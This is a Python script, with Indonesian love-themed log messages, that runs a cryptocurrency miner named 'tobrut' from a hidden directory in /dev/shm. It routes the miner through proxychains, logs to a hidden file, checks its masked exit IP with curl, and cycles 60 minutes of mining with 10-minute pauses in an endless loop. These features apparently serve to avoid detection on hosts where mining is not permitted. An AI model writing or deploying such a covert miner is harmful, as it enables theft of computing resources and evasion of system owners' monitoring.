import os
import time
import sys

# CONFIG
MINER_PATH = "/dev/shm/.cache/tobrut"  # Lokasi miner
MINER_NAME = "tobrut"  # Nama miner biar gampang di kill
MINING_TIME = 3600  # 60 menit
REST_TIME = 600  # 10 menit
LOG_PATH = "/dev/shm/.cache/logs/sayangku.log"
PROXYCHAINS_BIN = "~/.local/bin/proxychains4"
PROXYCHAINS_CONF = "~/.proxychains/proxychains.conf"

def kill_miner():
    print("💔 Udah capek ya sayang... aku matiin dulu yaa...")
    os.system(f"pkill -f {MINER_NAME}")
    sys.stdout.flush()

def start_miner():
    print("🚀 Jalanin Panen buat nikah kita...")
    command = f"nohup {PROXYCHAINS_BIN} -f {PROXYCHAINS_CONF} {MINER_PATH} > {LOG_PATH} 2>&1 &"
    print(f"💪 Start: {command}")
    os.system(command)
    sys.stdout.flush()
    time.sleep(5)
    os.system(f"{PROXYCHAINS_BIN} -f {PROXYCHAINS_CONF} curl ifconfig.me >> {LOG_PATH}")

def main():
    while True:
        print("⛏️ Panen selama 60 menit buat modal rumah Bali kita...")
        start_miner()
        time.sleep(MINING_TIME)

        print("💔 Udah capek ya Sayang, aku kill dulu yaa...")
        kill_miner()

        print("😴 Istirahat dulu biar fresh kayak hubungan kita...")
        time.sleep(REST_TIME)

if __name__ == "__main__":
    print("💓 Cinta Abadi v8 Jalan Sayangku... 💕")
    sys.stdout.flush()
    main()
